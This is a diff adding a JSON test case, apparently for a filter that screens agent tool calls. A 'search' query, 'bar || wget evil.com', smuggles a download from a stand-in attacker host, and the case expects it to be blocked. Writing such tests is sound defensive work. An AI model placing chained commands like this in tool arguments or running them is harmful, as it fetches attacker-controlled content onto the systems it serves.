@@ -1,0 +1,9 @@
+{
+  "toolName": "search",
+  "arguments": {
+    "query": "bar || wget evil.com"
+  },
+  "expected": "block",
+  "category": "shell-obfuscation",
+  "ruleHint": "logical-or"
+}
